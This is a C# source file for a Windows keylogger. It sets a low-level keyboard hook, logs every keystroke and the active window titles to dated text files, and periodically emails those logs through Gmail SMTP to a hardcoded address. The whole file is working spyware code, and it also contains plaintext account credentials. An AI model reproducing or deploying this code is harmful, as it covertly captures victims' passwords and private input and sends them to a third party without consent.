using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    class Program
    {
        #region hook key board
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int GetWindowThreadProcessId(IntPtr windowHandle, out int processId);
        [DllImport("user32.dll")]
        public static extern int GetWindowText(int hWnd, StringBuilder text, int count);
       

        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
           // Console.WriteLine((Keys)vkCode);
            string logNameToWrite = Application.StartupPath +@"\"+ DateTime.Now.ToLongDateString() + logExtendtion;
            Console.OutputEncoding = Encoding.UTF8;
            Console.InputEncoding = Encoding.UTF8;
            StreamWriter sw = new StreamWriter(logNameToWrite, true,Encoding.UTF8);

            sw.Write((Keys)vkCode);
            sw.Close();
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        /// private string lastWindowTitle;
        private string lastWindowTitle;
        private void WriteCurrentWindowInformation()
        {
            var activeWindowId = GetForegroundWindow();
            if (activeWindowId.Equals(0))
            {
                return;
            }

            int processId;
           GetWindowThreadProcessId(activeWindowId, out processId);

            if (processId == 0)
            {
                return;
            }

            Process foregroundProcess = Process.GetProcessById(processId);
            var windowTitle = string.Empty;

            try
            {
                if (!string.IsNullOrEmpty(foregroundProcess.MainWindowTitle))
                {
                    windowTitle = foregroundProcess.MainWindowTitle;
                }
            }
            catch (Exception)
            {
            }

            try
            {
                if (string.IsNullOrEmpty(windowTitle))
                {
                    const int Count = 1024;
                    var sb = new StringBuilder(Count);
                    GetWindowText((int)activeWindowId, sb, Count);

                    windowTitle = sb.ToString();
                }
            }
            catch (Exception)
            {
            }

            if (lastWindowTitle != windowTitle)
            {

                Console.WriteLine("User:{0}\nTime: {1}\nWindowTitle: {2}\n", Program.userName,
                    DateTime.Now.ToString("dd/MM/yyyy  HH:mm:ss"),
                    windowTitle);
             
                
               lastWindowTitle = windowTitle;
            }
        }
        static int interval = 1;
        static int captureTime = 100;
        static void StartTimmer()
        {
            Program program = new Program();
            Thread thread = new Thread(() => {
                while (true)
                {
                    Thread.Sleep(1);
                    if (interval % captureTime == 0)
                        program.WriteCurrentWindowInformation();
                    if (interval % mailTime == 0)
                        SendMail();
                
                    if (interval % 200 == 0)
                        HookKeyboard();
                    interval++;
                    if (interval >= 1000000)
                        interval = 0;
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
     
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        #endregion
      
        static int mailTime = 5000;
        static void SendMail()
        {   
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("email@gmail.com");
                mail.To.Add("phucdt1280@gmail.com");
                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                mail.Body = "This is mail for keylogger\n";

                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;
     

                if (File.Exists(logFile))
                {
                    // StreamReader sr = new StreamReader(logFile);
                    //mail.Body += sr.ReadToEnd();
                    //sr.Close();
                    //System.Net.Mail.Attachment attachment;
                    //attachment = new System.Net.Mail.Attachment(logFile);
                    //mail.Attachments.Add(attachment);
                    mail.Attachments.Add(new Attachment(logFile));

                }

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("phucdt1280@gmail.com", "nitranhngao@81299@");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                Console.WriteLine("Send mail!");


            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        static void Main(string[] args)
        {
            StartTimmer();
          //  HookKeyboard(); 

        }
    }
}
